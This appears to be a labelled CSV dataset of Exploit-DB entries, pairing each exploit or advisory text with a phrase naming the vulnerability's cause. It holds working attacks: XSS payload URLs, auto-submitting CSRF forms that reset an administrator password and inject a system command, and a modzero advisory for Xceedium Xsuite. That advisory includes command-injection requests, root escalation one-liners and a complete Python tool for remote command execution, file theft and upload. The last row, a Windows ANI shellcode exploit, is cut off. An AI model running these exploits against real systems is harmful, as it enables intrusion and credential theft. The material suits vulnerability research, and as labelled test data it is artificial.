VorlageID=3&QU02=1-&QUL=sample&QUB=%22%3E%3Cscript%3Ealert%28%22XSS2%22%29 %3B%3C%2Fscript%3E&QUG=sample&OSPK01=141&OSPK02=0&OSSK05=&OSSK09=1&PJ12=14 &DATAUFTT=07&DATAUFMM=01&DATAUFJJJJ=2008&DATLIEFTT=24&DATLIEFMM=01& DATLIEFJJJJ=2008&DATLIEFHH=&DATLIEFMN=&PJ13=& Bez74=%22%3E%3Cscript%3Ealert%28%22XSS4%22%29%3B%3C%2Fscript%3E& LDate74TT=24&LDate74MM=01&LDate74JJJJ=2008&LDate74HH=13& LDate74MN=00&BOXP74=4&REA01774=59&REA01874=sample& OutPE0174=0&OutPAP74=8385&Bem74=sample&REA001=&REA010=&REA007=1&REA008=2& REA011=0&REA013=0&REA015=0&LEISTung=sample&LangFlag=&exit=&SelectTab= &ContentBox=&OpenContentBox=&LoginPressed=false&SaveButton=true& CheckXYZ=Send&yOffsetScroll=0",fails to properly sanitize user-supplied input,1
34649,Netautor Professional 5.5 - 'login2.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/43290/info  Netautor Professional is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.  An attacker may leverage this issue to execute arbitrary HTML and script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  Netautor Professional 5.5.0 is vulnerable; other versions may also be affected.   http://www.example.com/netautor/napro4/home/login2.php?goback=%22%3Cscript%3Ealert%28document.location%29%3C/script%3E,fails to sufficiently sanitize user-supplied data,1
35259,"PivotX 2.2 - '/pivotx/includes/blogroll.php?color' Cross-Site Scripting source: https://www.securityfocus.com/bid/45996/info  PivotX is prone to multiple cross-site-scripting vulnerabilities because it fails to properly sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.  PivotX 2.2.0 is vulnerable; other versions may also be affected.   http://www.example.com/includes/blogroll.php?id=1&color=123;}</style><script>alert(""XSS"");</script>|",fails to properly sanitize user-supplied input,1
39586,"Dating Pro Genie 2015.7 - Cross-Site Request Forgery Advisory ID: HTB23294 Product: Dating Pro Vendor: DatingPro Vulnerable Version(s): Genie (2015.7) and probably prior Tested Version: Genie (2015.7) Advisory Publication:  February 10, 2016  [without technical details] Vendor Notification: February 10, 2016  Vendor Patch: February 29, 2016  Public Disclosure: March 18, 2016  Vulnerability Type: Cross-Site Request Forgery [CWE-352] Risk Level: Critical  CVSSv3 Base Scores: 8.8 [CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H], 9.6 [CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H] Solution Status: Fixed by Vendor Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ )   -----------------------------------------------------------------------------------------------  Advisory Details:  High-Tech Bridge Security Research Lab discovered multiple Cross-Site Request Forgery (CSRF) vulnerabilities in a popular dating social network Dating Pro.   A remote unauthenticated attacker can perform CSRF attacks to change administrator’s credentials and execute arbitrary system commands. Successful exploitation of the vulnerability may allow attacker to gain complete control over the vulnerable website, all its users and databases.    1) CSRF in ""/admin/ausers/index""  The vulnerability exists due to the absence of validation of HTTP request origin in ""/admin/ausers/index"" script. A remote unauthenticated attacker can create a specially crafted malicious web page with CSRF exploit, trick a logged-in administrator to visit the page, spoof the HTTP request as if it was coming from the legitimate user, and change login, email address and password of the current website administrator. This means a total takeover of the website.   A simple CSRF exploit below will change login, email and password to ""admin"", ""admin@mail.com"" and ""123456"" respectively.   To reproduce the vulnerability, just create an empty HTML file, paste the CSRF exploit code into it, login to iTop website and open the file in your browser:   <form action=""http://[host]/admin/ausers/index"" method=""post"" name=""main""> <input type=""hidden"" name=""nickname"" value=""admin""> <input type=""hidden"" name=""email"" value=""admin@mail.com""> <input type=""hidden"" name=""update_password"" value=""1""> <input type=""hidden"" name=""password"" value=""123456""> <input type=""hidden"" name=""repassword"" value=""123456""> <input type=""hidden"" name=""name"" value=""admin""> <input type=""hidden"" name=""description"" value=""""> <input type=""hidden"" name=""btn_save"" value=""Save""> <input value=""submit"" id=""btn"" type=""submit"" /> </form><script>document.main.submit();</script>   Now you can login as administrator using the above-mentioned credentials.   2) CSRF in /admin/notifications/settings/  The vulnerability exists due to absence of validation of HTTP request origin in ""/admin/notifications/settings/"" script. A remote unauthenticated attacker can create a specially crafted malicious web page with CSRF exploit, trick a logged-in administrator to visit the page, spoof the HTTP request as if it was coming from the legitimate user, and execute arbitrary system commands with privileges of the web server.   A simple exploit below will replace full path to sendmail program with the following ""cp config.php config.txt"" system command that will copy ""config.php"" file into ""config.txt"" making its content publicly accessible:   <form action=""http://[host]/admin/notifications/settings/"" method=""post"" name=""main""> <input type=""hidden"" name=""mail_charset"" value=""utf-8""> <input type=""hidden"" name=""mail_protocol"" value=""sendmail""> <input type=""hidden"" name=""mail_useragent"" value=""pg-mailer""> <input type=""hidden"" name=""mail_from_email"" value=""admin@site.com""> <input type=""hidden"" name=""mail_from_name"" value=""PgSoftware""> <input type=""hidden"" name="""" value=""""> <input type=""hidden"" name=""btn_save"" value=""Save""> <input type=""hidden"" name=""mail_mailpath"" value=""cp config.php config.txt ||""> </form><script>document.main.submit();</script>   The command will be executed the next time when any email is being sent by the vulnerable web application.   It is also possible to trigger this event using the following following CSRF exploit:   <form action=""http://[host]/admin/notifications/settings/"" method=""post"" name=""main""> <input type=""hidden"" name=""mail_to_email"" value=""mail@mail.com""> <input type=""hidden"" name=""btn_test"" value=""Send""> </form><script>document.main.submit();</script>    -----------------------------------------------------------------------------------------------  Solution:  Update to Genie (2015.7) released after February 29, 2016.  -----------------------------------------------------------------------------------------------  References:  [1] High-Tech Bridge Advisory HTB23294 - https://www.htbridge.com/advisory/HTB23294  - Admin Password Reset & RCE via CSRF in Dating Pro [2] Dating Pro - http://www.datingpro.com - Everything you need to start and run a dating business. [3] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types. [4] ImmuniWeb® - https://www.htbridge.com/immuniweb/ - web security platform by High-Tech Bridge for on-demand and continuous web application security, vulnerability management, monitoring and PCI DSS compliance. [5] Free SSL/TLS Server test - https://www.htbridge.com/ssl/ - check your SSL implementation for PCI DSS and NIST compliance. Supports all types of protocols.  -----------------------------------------------------------------------------------------------  Disclaimer: The information provided in this Advisory is provided ""as is"" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] in the References.","the absence of validation of HTTP request origin in ""/admin/ausers/index"" script",1
32528,iPeGuestbook 1.7/2.0 - 'pg' Cross-Site Scripting source: https://www.securityfocus.com/bid/31911/info  iPei Guestbook is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied input data.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.   http://www.example.com/index.php?pg=c0d3_xss,fails to sufficiently sanitize user-supplied input data,1
37708,"Xceedium Xsuite - Multiple Vulnerabilities See also: http://www.modzero.ch/advisories/MZ-15-02-Xceedium-Xsuite.txt  ---------------------------------------------------------------------  modzero Security Advisory: Multiple Vulnerabilities in Xceedium Xsuite [MZ-15-02]  ---------------------------------------------------------------------  ---------------------------------------------------------------------  1. Timeline  ---------------------------------------------------------------------   * 2015-06-17: Vulnerabilities have been discovered  * 2015-06-19: Vendor notified via support@xceedium.com  * 2015-06-19: CVE IDs assigned  * 2015-06-26: Public reminder sent via Twitter  * 2015-06-26: Findings updated  * 2015-07-22: Release after Xceedium did not respond within                more than 15 business days  ---------------------------------------------------------------------  2. Summary  ---------------------------------------------------------------------  Vendor: Xceedium, Inc.  Products known to be affected:   * Xsuite 2.3.0  * Xsuite 2.4.3.0  * Other products and versions may be affected as well.  Severity: Overall High Remote exploitable: remote and local  The  Xsuite system  controls  and audits  privileged  user access  to computers  in a  network  environment.  Several vulnerabilities  were identified in the solution. The vulnerabilities allow unauthenticated users to fully compromise an Xsuite host over the network.  The  issues  described  below  are only  examples  for  vulnerability classes. The solution is systematically affected by similar issues.  CVE-2015-4664 to CVE-2015-4669 was  assigned to these vulnerabilities and vulnerability classes.  ---------------------------------------------------------------------  3. Details  ---------------------------------------------------------------------  3.1   Command  injection   via  the   login  form   (Severity:  High, CVE-2015-4664)  The  login form  is affected  by a  code injection  vulnerability via the  ""id"" POST  parameter, which  allows an  unauthenticated attacker to  inject  Linux commands.  These  commands  are executed  with  the privileges  of  the Linux  user  ""www-data"".  The injected  command's output is then sent back to the attacker.  An example HTTP request and response is shown below.  HTTP request:  POST /login.php HTTP/1.1 Host: XXX.XXX.XXX.XXX User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://XXX.XXX.XXX.XXX/ Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 80  id=admin'|cat /etc/passwd||a%20%23|&pass=admin&authTypeOption=use_local&loginID=    HTTP response:  HTTP/1.1 200 OK Date: Wed, 17 Jun 2015 10:47:47 GMT Server: Apache X-Frame-Options: SAMEORIGIN Set-Cookie: PHPSESSID=6d5b0fbf8349caf10493f65e8f0b131b; path=/; secure; HttpOnly Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Set-Cookie: PROXY_AUTH_FAILURE=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; path=/ Strict-Transport-Security: max-age=365246060 Content-Length: 2096 Keep-Alive: timeout=150, max=300 Connection: Keep-Alive Content-Type: text/html; charset=UTF-8  root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh [...]   3.2   Cross-Site    Scripting   Vulnerability    (Severity:   Medium, CVE-2015-4665)  The  following   example  shows  a  reflected   cross-site  scripting vulnerability  that injects  JavaScript code  into a  user's session. Here, the HTTP  response contains a message, which seems  to be JSON. However, the content type is  ""text/html"". Thus, a web browser treats the server response as HTML code (fragment).  HTTP request:  GET /ajax_cmd.php?cmd=COMPLETGRAPHYRECORDING&fileName=<img%20src%3da%20onload%3dalert(1)> HTTP/1.1 Host: XXX.XXX.XXX.XXX User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: PHPSESSID=c4f6547d9d889336a7f4a9a953cc3815 Connection: keep-alive   HTTP response:  HTTP/1.1 200 OK Date: Thu, 18 Jun 2015 11:10:07 GMT Server: Apache X-Frame-Options: SAMEORIGIN Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Strict-Transport-Security: max-age=365246060 Content-Length: 70 Keep-Alive: timeout=150, max=300 Connection: Keep-Alive Content-Type: text/html; charset=UTF-8  [""Unable to find decryption key for file <img src=a onload=alert(1)>""]   3.3 Directory  traversal and  File Download  Vulnerability (Severity: Medium/High, CVE-2015-4666)  Due to insufficient input validation the ""read_sessionlog.php"" script is  affected by  a  directory traversal  vulnerability, which  allows unauthenticated users to obtain any files that the user ""www-data"" is allowed to  access. The  script tries  to cut  the ""../""  pattern for relative  directory  addressing,  but  fails  to  sanitize  specially crafted input. Hence, it is still possible to download files from the host by accessing the script as shown below:  https://XXX.XXX.XXX.XXX/opm/read_sessionlog.php?logFile=....//....//....//....//etc/passwd  The   following   code   is   part    of   the   source   code   file /var/www/htdocs/uag/web/opm/read_sessionlog.php  [...] $file_path= $_REQUEST[""logFile""]; [...]  if (strpos($file_path, '/opt/rpath') !== 0) { $file_path = '/opt/rpath/' .$file_path; }  if($startByte < 1)         $startByte=0;  if (isset($file_path)) {       // make sure users cannot hack via ../../    $file_path = preg_replace(""/\.\.\//"", """", $file_path);        $file_path = stripslashes($file_path);    // if the file does not exist, display it    if (!is_file($file_path)) {     echo 'File (' .$_REQUEST[""logFile""]. ') does not exist.';     exit(0);            } }    output_file($file_path, 'VT100LogA.txt', '', $startByte, $searchChar, $searchDir, $totalByte); [...]   3.4  Privilege  escalation   via  ""/sbin/spadmind""  (Severity:  High, CVE-2015-4664)  The  ""spadmind""   service  allows  local  users   to  escalate  their privileges  to  become  ""root"".   In  combination  with  the  command injection  vulnerability from  section  3.1, it  is  possible to  run arbitrary commands as ""root"" user via the network.  The web interface  runs under the privileges of the  web server user. To execute  privileged commands,  the web interface  sends text-based messages  via a  socket  to the  ""spadmind""  process. The  ""spadmind"" process has a  listening socket bound to localhost:2210  and reads in text lines, which are partially  used as parameter for system command execution. Since the ""spadmind"" process  does not validate the input, an  attacker  is able  to  inject  commands  that are  executed  with super-user privileges.  File: /sbin/spadmind  [...]     # socket     my $clsock = shift;     # command and number of lines to process     my $command  = <$clsock>;     my $numlines = <$clsock>;      chomp($command);     chomp($numlines); [...]     } elsif ($command eq 'expect') {         chomp($line = <$clsock>);         my $res = `expect $line`;         if ($res =~ /(STATUS=\w+)/) {             $resp = $1;         } else {             $resp = 'unknown';         } [...]  In the quoted  code above, running the command  ""expect"" and allowing users to  specify parameters  is a vulnerability,  because parameters could be passed via option ""-c"" to invoke shell commands.  $ echo -e ""expect\n1\n-c garbage;id > /tmp/x23"" | ncat --send-only 127.0.0.1 2210; sleep 1; cat /tmp/x23 uid=0(root) gid=0(root)  $ echo -e ""timezone\n1\n;id > /tmp/x42"" | ncat --send-only 127.0.0.1 2210; sleep 1; cat /tmp/x42  uid=0(root) gid=0(root)   3.5 Hard-coded database credentials (Severity: Low, CVE-2015-4667)  The  software uses  hard-coded credentials  at several  places, which makes it unfeasible to change database credentials regularly.  $ grep -R n1b2dy . ./uag/db/init/install-xio-uag-data.sql:SET PASSWORD FOR 'uaguser'@'localhost'=PASSWORD('n1b2dy'); ./uag/db/init/upgrade401SP2to402.pl:use constant LW_DBPASS   => ""n1b2dy""; ./www/htdocs/uag/web/activeActiveCmd.php:            $res = mysql_connect(""localhost"", ""uaguser"", ""n1b2dy""); ./www/htdocs/uag/web/activeActiveCmd.php:    $link = mysql_connect(""localhost"", ""uaguser"", ""n1b2dy""); ./www/htdocs/uag/web/activeActiveCmd.php:    $link = mysql_connect(""localhost"", ""uaguser"", ""n1b2dy""); ./www/htdocs/uag/web/activeActiveCmd.php:    $res = mysql_connect(""localhost"", ""uaguser"", ""n1b2dy""); ./www/htdocs/uag/web/activeActiveCmd.php:    $link = mysql_connect(""localhost"", ""uaguser"", ""n1b2dy""); ./www/htdocs/uag/web/activeActiveCmd.php:        $link = mysql_connect(""localhost"", ""uaguser"", ""n1b2dy""); ./www/htdocs/uag/web/ajax_cmd.php:    $link = mysql_connect(""localhost"", ""uaguser"" ,""n1b2dy""); ./www/htdocs/uag/cgi/external_log_sync.php:    $db_link_local = new mysqli(""localhost"", ""uaguser"", ""n1b2dy"", ""uag""); ./www/htdocs/uag/config/db.php:$dbchoices            = array(""mysql"", ""uaguser"", ""n1b2dy""); ./www/htdocs/uag/services/main/common/Configuration.php:    const K_DB_PASS_DEFAULT  = 'n1b2dy'; ./www/htdocs/uag/functions/eula_check.php:        $link = mysql_connect(""localhost"", ""uaguser"", ""n1b2dy""); ./www/htdocs/uag/functions/eula_check.php:        $link = mysql_connect(""localhost"", ""uaguser"", ""n1b2dy""); ./www/htdocs/uag/functions/db.php:        $dbchoices            = array(""mysql"", ""uaguser"", ""n1b2dy""); ./www/htdocs/uag/functions/remove_disabled_cron.pl:                        'n1b2dy',  $ grep -R n1b2dy sbin sbin/logwatch:use constant LW_DBPASS   => ""n1b2dy""; sbin/interrogate-vmware.pl:  use constant   DB_PASSWORD  => 'n1b2dy'; Binary file sbin/xcd_sshproxy matches Binary file sbin/xcd_upd matches Binary file sbin/vlmon matches Binary file sbin/sessd matches Binary file sbin/gksfdm matches Binary file sbin/xcdmsubagent matches sbin/logload:my $dbh = DBI->connect(""DBI:mysql:uag"", ""uaguser"", ""n1b2dy"") or die(""Can not connect to the database\n""); sbin/make-auth-token.pl:  my $passwd         = 'n1b2dy'; sbin/rotate_coredumps.pl:  my $passwd         = 'n1b2dy'; Binary file sbin/loadcrl matches sbin/ad_upd:      $dbh = DBI->connect( 'DBI:mysql:uag', 'uaguser', 'n1b2dy', { autocommit => 0 } ) sbin/ad_upd:      my $db = DBI->connect( 'DBI:mysql:uag', 'uaguser', 'n1b2dy', { autocommit => 0 } ) sbin/ad_upd:      $dbh = DBI->connect_cached( 'DBI:mysql:uag', 'uaguser', 'n1b2dy', { autocommit => 0 } ) sbin/rfscheck:use constant LW_DBPASS  => ""n1b2dy""; sbin/auth.pl:    'n1b2dy', sbin/apwd:  my $dbh = DBI->connect(""DBI:mysql:uag"", ""uaguser"", ""n1b2dy"") or return; sbin/update_crld:my($dbpass)=""n1b2dy""; sbin/update_crld:                            'n1b2dy',   3.6.   No   password  for   MySQL   ""root""   user  (Severity:   High, CVE-2015-4669)  Local  users  can access  databases  on  the system  without  further restrictions, because the MySQL ""root"" user has no password set.  $ python XceediumXsuitePoC.py --host  XXX.XXX.XXX.XXX --cmd 'echo ""update user set active = 0, passwd=sha1(\""myknownpw\"") where u_name = \""mytargetuser\"";""| mysql -u root uag'   3.7 Open redirect (Severity: Low, CVE-2015-4668)  An attacker may craft a link to  an Xsuite host that looks valid, but tricks the user  and abuses an open redirect  vulnerability in Xsuite to redirect a user to a third  party web site, for example a web site with malware.  https://XXX.XXX.XXX.XXX/openwin.php?redirurl=%68%74%74%70%3a%2f%2f%77%77%77%2e%6d%6f%64%7a%65%72%6f%2e%63%68  File: /var/www/htdocs/uag/web/openwin.php  <? $redirurl = $_GET['redirurl'];  header('Location: ' .$redirurl);  ?>   3.8 Possible issues not further investigated  Passwords stored in  the database are unsalted  hashes, which reduces the attack complexity if an attacker  has access to the database. The setup under invesatigation partially used MD5 and SHA1 hashes.  The web interface and scripts  create SQL statements by concatenating strings and user-supplied input without proper input validation. This may result in SQL injections.  $ grep -i -R  where . | grep -E '\$_(POST|GET)' ./web/filter/filter_sfa.php:    $query = ""delete from socket_filter_mon where sfm_id='"".$_GET['sfm_id'].""'""; ./web/filter/filter_command_list.php:        $query = ""select * from cmd_list where id='"".$_POST[""s_list""].""'""; ./web/filter/filter_command_list.php:        $query = ""delete from cmd_list where id='"".$_POST[""s_list""].""'""; ./web/filter/filter_command_list.php:        $query = ""delete from cmd_keywords where list_id='"".$_POST[""s_list""].""'""; ./web/filter/filter_command_list.php:                 ""where command_filter = '"".$_POST[""s_list""].""'""; ./web/filter/filter_command_list.php:    $query = ""select * from cmd_list where list_type='"".$_POST['r_ltype'].""' order by listname""; ./web/filter/filter_command_list.php:              where id='"".$_POST['id'].""'""; ./web/filter/filter_command.php:    $query = ""update intervention_configuration set value = '"".$_POST['number_warnings'].""' where name = 'number_of_warnings'""; ./web/filter/filter_command.php:    $query = ""update intervention_configuration set value = '"".$_POST['blacklist_action'].""' where name = 'intervention_action'""; ./web/filter/filter_command.php:    $query = ""update intervention_configuration set value = '"".$_POST['blacklist_intervention_message'].""' where name = 'blacklist_intervention_message'""; ./web/filter/filter_command.php:    $query = ""update intervention_configuration set value = '"".$_POST['whitelist_intervention_message'].""' where name = 'whitelist_intervention_message'""; ./web/filter/filter_command.php:    $query = ""update intervention_configuration set value = '"".$_POST['alert_email_message'].""' where name = 'alert_email_message'""; ./web/socketFilterCmd.php:        $res = mysql_query(""SELECT h_id FROM host where hostID="" . $_GET['h_id']); ./web/socketFilterCmd.php:        $res = mysql_query(""SELECT h_id FROM host where hostID="" . $_GET['h_id']); ./web/socketFilterCmd.php:    $query = ""delete from rdp_lock where id='"".$_GET['rdp_id'].""'""; ./web/socketFilterCmd.php:    $query = ""select hostID from host where h_id = '"".db_esc($_GET[""device_name""]).""'""; ./web/socketFilterCmd.php:              where sess_id='"".$_GET['PHPSESSID'].""' and ./web/socketFilterCmd.php:              $query = 'SELECT seq FROM gkconnection WHERE sess_id = ""' .$sessid. '"" AND hostID = ""' .$_GET['h_id']. '"" AND pid IS NOT NULL'; ./web/socketFilterCmd.php:                        $query = 'SELECT seq FROM gkconnection WHERE sess_id = ""' .$sessid. '"" AND hostID = ""' .$_GET['h_id']. '"" AND pid IS NOT NULL'; ./web/socketFilterCmd.php:                     $query = 'SELECT seq FROM gkconnection WHERE sess_id = ""' .$sessid. '"" AND hostID = ""' .$_GET['h_id']. '"" AND pid IS NOT NULL'; ./web/ajax_cmd.php:    $query = ""select * from session where sess_id='"".$_GET['param'].""'""; ./web/ajax_cmd.php:                        WHERE hostID = '"".$_GET['hostID'].""'""; ./web/ajax_cmd.php:    $query = 'SELECT u.userID FROM session AS s, user AS u WHERE s.u_name = u.u_name AND s.sess_id = ""' .db_esc($_GET['sess_id']). '""'; ./web/dev/dev_ajax.php:    $update_query = ""UPDATE kta_settings set value = '"".$_GET[$name].""' where name = '"".$name.""'""; ./web/dev/dev_group_ajax.php:    if ($_POST['where'] == 'hosts' || $_POST['where'] == 'hosts_sel') { ./web/dev/dev_group_ajax.php:        $where = $_POST['where']; ./web/dev/dev_group_ajax.php:    if ($_POST['where'] == 'hosts' || $_POST['where'] == 'hosts_sel') { ./web/dev/dev_group_ajax.php:        $where = $_POST['where']; ./web/dev/dev_group_ajax.php:    if ($_POST['where'] == 'hosts' || $_POST['where'] == 'hosts_sel') { ./web/dev/dev_group_ajax.php:        $where = $_POST['where']; ./features/dev_sfa.php:    $query = ""delete from socket_filter_mon where sfm_id='"".$_GET['sfm_id'].""'""; ./hconfig/functions/smartb.php:      $query = ""delete from smartb_cfg_files where fileName = '"".$_POST[""filename""].""'"";   ---------------------------------------------------------------------  4. Impact  ---------------------------------------------------------------------  The identified  vulnerabilities allows any user  to execute arbitrary commands as system  super-user (""root""). Since the system  is used to control other  devices (for  example, via RDP  and SSH),  an attacker would add malicous modification to the Java-based clients for RDP and SSH to exfiltrate access credentials for computers and to abuse these credentials in further steps.   ---------------------------------------------------------------------  5. Proof of concept exploit   ---------------------------------------------------------------------  #!/usr/bin/python # # Proof of Concept Tool to Exploit Vulnerabilities in  # Xceedium Xsuite # # Author: modzero AG, Switzerland #  import httplib2, urllib import re import base64 from optparse import OptionParser  url = ''  def get_command_output(cmd):     marker = '~~~~!!!!~~~~!!!!~~~~!!!!~~~~!!!!~~~~!!!!~~~~!!!!~~~~!!!!~~~~!!!!~~~~!!!!~~~~!!!!'     values = {         'id' : ""admin'| echo "" + marker +""; "" + cmd + "" ; echo -n "" + marker + ""||X #"",         'pass' : 'foo',         'authTypeOption' : 'use_local',         'loginID' : '',         }     headers = {         'Content-Type': 'application/x-www-form-urlencoded',         }     values = urllib.urlencode(values)     h = httplib2.Http(disable_ssl_certificate_validation=True)     resp, content = h.request(url, ""POST"", values, headers = headers)     offset1 = content.find(marker) + len(marker)     offset2 = content.rfind(marker, offset1 + 1)     try:         return base64.standard_b64decode(content[offset1:offset2])     except:         return content[offset1:offset2]   def get_dir(retrieve_dir):     fname = re.sub(r'\/', '_', retrieve_dir) + "".tgz""     text_file = open(fname, ""w"")     text_file.write(get_command_output(""tar -czf - "" + retrieve_dir + "" | base64""))     text_file.close()  def get_file(retrieve_file):     fname = re.sub(r'\/', '_', retrieve_file)     data = get_command_output(""cat "" + retrieve_file + "" | base64"")     print data     text_file = open(fname, ""w"")     text_file.write(data)     text_file.close()  def exec_cmd(cmd):     data = get_command_output(cmd + "" | base64"")     print data  def exec_root(cmd):     data = get_command_output('echo -e ""timezone\n1\n;' + cmd + ' > /tmp/.x"" | ncat --send-only 127.0.0.1 2210; sleep 1; cat /tmp/.x | base64')     print data  def upload_file(fname, dst_file):     with open(fname, 'r') as content_file:         b64_content = base64.standard_b64encode(content_file.read())         get_command_output(""echo "" + b64_content + "" | base64 -d > "" + dst_file)  def main():     global url     parser = OptionParser()     parser.add_option(""--host"", dest=""host"", help=""The host to attack"")     parser.add_option(""--dir"", dest=""dir"", help=""The directory to retrieve"")     parser.add_option(""--file"", dest=""file"", help=""The file to retrieve"")     parser.add_option(""--cmd"", dest=""cmd"", help=""The command to execute"")     parser.add_option(""--root"", dest=""root"", help=""The command to execute with root privileges"")     parser.add_option(""--upload"", dest=""upload"", help=""A local file to upload"")     parser.add_option(""--dst"", dest=""dst_file"", help=""The destination file for uploaded content"")          (options, args) = parser.parse_args()          if options.host:         url = 'https://%s/login.php' % (options.host)              if options.dir:         get_dir(options.dir)     elif options.file:         get_file(options.file)     elif options.cmd:         exec_cmd(options.cmd)     elif options.root:         exec_root(options.root)     elif options.upload:         upload_file(options.upload, options.dst_file)          if __name__ == ""__main__"":     main()   ---------------------------------------------------------------------  6. Workaround  ---------------------------------------------------------------------  A workaround is not known.  ---------------------------------------------------------------------  7. Fix  ---------------------------------------------------------------------  It is not known to modzero, if a security fix is available.  ---------------------------------------------------------------------  8. Credits  ---------------------------------------------------------------------   * Martin Schobert (martin@modzero.ch)  ---------------------------------------------------------------------  9. About modzero  ---------------------------------------------------------------------  The  independent  Swiss  company  modzero  AG  assists  clients  with security analysis  in the complex  areas of computer  technology. The focus  lies  on  highly  detailed  technical  analysis  of  concepts, software  and  hardware components  as  well  as the  development  of individual solutions.  Colleagues at  modzero AG work  exclusively in practical, highly  technical computer-security areas and  can draw on decades  of experience  in  various platforms,  system concepts,  and designs.  https://www.modzero.ch  contact@modzero.ch  ---------------------------------------------------------------------  10. Disclaimer  ---------------------------------------------------------------------  The information  in the advisory  is believed  to be accurate  at the time of publishing  based on currently available  information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with  regard to this information. Neither the author  nor  the publisher  accepts  any  liability for  any  direct, indirect, or  consequential loss  or damage arising  from use  of, or reliance on, this information.",fails to sanitize specially crafted input,1
25486,RaidenFTPd 2.4 - Unauthorized File Access source: https://www.securityfocus.com/bid/13292/info  RaidenFTPD is prone to a vulnerability that could allow unauthorized access to files outside the FTP root. The issue exists due to a lack of sufficient sanitization performed on 'SITE urlget' requests. Directory traversal sequences may be passed as a parameter for this request.  This vulnerability allows a remote attacker to read files outside of the FTP document root directory. An attacker may read files with the privileges of the FTP server process.  This issue was reported to affect all versions of RaidenFTPD prior to 2.4.2241.  quote site urlget file://\..\\boot.ini,a lack of sufficient sanitization performed on 'SITE urlget' requests,1
3617,"Microsoft Windows - Animated Cursor '.ani' Local Stack Overflow /* * Copyright (c) 2007 devcode * * *			^^ D E V C O D E ^^ * * Windows .ANI LoadAniIcon Stack Overflow * [CVE-2007-1765] * * * Description: *    A vulnerability has been identified in Microsoft Windows, *	  which could be exploited by remote attackers to take complete *	  control of an affected system. This issue is due to a stack overflow *    error within the ""LoadAniIcon()"" [user32.dll] function when rendering *    cursors, animated cursors or icons with a malformed header, which could *	  be exploited by remote attackers to execute arbitrary commands by *    tricking a user into visiting a malicious web page or viewing an email *    message containing a specially crafted ANI file. * * Hotfix/Patch: *    None as of this time. * * Vulnerable systems: *	  Microsoft Windows 2000 Service Pack 4 *	  Microsoft Windows XP Service Pack 2 *	  Microsoft Windows XP 64-Bit Edition version 2003 (Itanium) *	  Microsoft Windows XP Professional x64 Edition *	  Microsoft Windows Server 2003 *	  Microsoft Windows Server 2003 (Itanium) *	  Microsoft Windows Server 2003 Service Pack 1 *	  Microsoft Windows Server 2003 Service Pack 1 (Itanium) *	  Microsoft Windows Server 2003 x64 Edition *	  Microsoft Windows Vista * *	  Microsoft Internet Explorer 6 *	  Microsoft Internet Explorer 7 * *    This is a PoC and was created for educational purposes only. The *	  author is not held responsible if this PoC does not work or is *	  used for any other purposes than the one stated above. * * Notes: *	  For this to work on XP SP2 on explorer.exe, DEP has to be turned *	  off. * */ #include <iostream> #include <windows.h>  /* ANI Header */ unsigned char uszAniHeader[] = ""\x52\x49\x46\x46\x00\x04\x00\x00\x41\x43\x4F\x4E\x61\x6E\x69\x68"" ""\x24\x00\x00\x00\x24\x00\x00\x00\xFF\xFF\x00\x00\x0A\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" ""\x10\x00\x00\x00\x01\x00\x00\x00\x54\x53\x49\x4C\x03\x00\x00\x00"" ""\x10\x00\x00\x00\x54\x53\x49\x4C\x03\x00\x00\x00\x02\x02\x02\x02"" ""\x61\x6E\x69\x68\xA8\x03\x00\x00"";  /* Shellcode - metasploit exec calc.exe ^^ */ unsigned char uszShellcode[] = ""\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"" ""\x49\x49\x49\x49\x49\x49\x49\x37\x49\x49\x49\x49\x51\x5a\x6a\x42"" ""\x58\x50\x30\x41\x31\x42\x41\x6b\x41\x41\x52\x32\x41\x42\x41\x32"" ""\x42\x41\x30\x42\x41\x58\x50\x38\x41\x42\x75\x38\x69\x79\x6c\x4a"" ""\x48\x67\x34\x47\x70\x77\x70\x53\x30\x6e\x6b\x67\x35\x45\x6c\x4c"" ""\x4b\x73\x4c\x74\x45\x31\x68\x54\x41\x68\x6f\x6c\x4b\x70\x4f\x57"" ""\x68\x6e\x6b\x71\x4f\x45\x70\x65\x51\x5a\x4b\x67\x39\x4c\x4b\x50"" ""\x34\x4c\x4b\x77\x71\x68\x6e\x75\x61\x4b\x70\x4e\x79\x6e\x4c\x4d"" 